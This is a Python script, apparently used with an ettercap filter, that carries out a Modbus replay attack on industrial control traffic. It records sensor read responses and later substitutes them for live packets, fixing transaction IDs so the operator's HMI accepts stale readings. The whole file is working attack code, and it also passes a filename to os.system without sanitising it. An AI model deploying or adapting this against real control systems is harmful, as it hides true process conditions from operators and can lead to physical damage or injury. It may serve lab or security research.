"""
    This script is used by the replay ettercap filter to replay sensor readings.
    It functions by recording any new packet to a history file, and, if the packet is already in the history,
    it rebroadcasts the historical data instead of the real current packet.
    A packet is new if the combination of its function code and length is not already in the historical file.

    Usage:
        python3 replay_packet_modifier.py [Packet Filename] [History Filename]
"""

from sys import argv
from os import system, remove, path
from time import time
import json

def get_packet_key(packet_contents):
    """
        Returns function_code, byte count as a comma separated string.

        If the key can't be generated because the packet is too short,
        return None.  
    """
    # JSON doesn't allow tuples to be keys, so turn the pair into a string.
    if len(packet_contents) >= 9:
        return "%s,%s" % (packet_contents[7], packet_contents[8])
    else:
        return None

def get_historical_data(history_file):
    """
        Collect data from the given historical file.
    """
    
    # if the file (somehow) doesn't exist yet, create it and place the empty dictionary in it
    if not path.exists(history_file):
        with open(history_file, "w") as history:
            json.dump({}, history)

    data = None
    with open(history_file, 'r') as history:
        data = json.load(history)
    
    return data

def store_new_data(packet_contents, history_file):
    """
        Store the given packet in our history file in the form:
        packet_key -> packet contents (as a list of ints)
    """
    data = get_historical_data(history_file)
    data[get_packet_key(packet_contents)] = packet_contents
    with open(history_file, "w") as history:
        json.dump(data, history)

def should_store(packet_contents, history_file):
    """
        A packet should be stored if the combination of function code and byte count is new.

        Relevant function codes (at index 7) are responses to read queries: 
            0x1 : coils
            0x2 : discrete inputs
            0x3 : holding registers
            0x4 : input registers

        The byte count is at index 8.
    """
    funcs_to_record = 0x1, 0x2, 0x3, 0x4
    return (len(packet_contents) >= 9 and 
                packet_contents[7] in funcs_to_record and 
                get_packet_key(packet_contents) not in get_historical_data(history_file)
            )

def get_packet(packet_contents, history_file):
    """
        Return old packet if it's in history, otherwise, return the packet as is.
    """
    try:
        # get the historical packet data (if it isn't there, go to except block)
        data = get_historical_data(history_file)[get_packet_key(packet_contents)]
        # fix the transaction identifier (first two bytes) so that this packet will be accepted by 
        # the HMI
        data[0], data[1] = packet_contents[0], packet_contents[1]
        return data
    except KeyError: # if this packet wasn't stored, return as-is
        return packet_contents

def process_packet(packet_contents, history_file):
    
    if should_store(packet_contents, history_file):
        # if the packet should be stored, store it
        store_new_data(packet_contents, history_file)
    
    return get_packet(packet_contents, history_file)

def main():
    try:
        # collect cmd args
        packetFile = argv[1]
        historicalDataFile = argv[2]
        
        # read this packet
        packetContents = None
        with open(packetFile, 'rb') as f:
            packetContents = [int(byte) for byte in list(f.read())]

        outputContents = process_packet(packetContents, historicalDataFile)

        t = str(time())[11:16]
        outputPacketFile = packetFile+t+".packet"
        with open(outputPacketFile, "wb") as p:
            p.write(bytearray(outputContents))

        # output to cmd line for ettercap to receive
        system("/usr/bin/cat %s" % outputPacketFile)

    finally:
        # clean up by removing extraneous files
        remove(outputPacketFile)
        remove(packetFile)

if __name__ == "__main__":
    main()
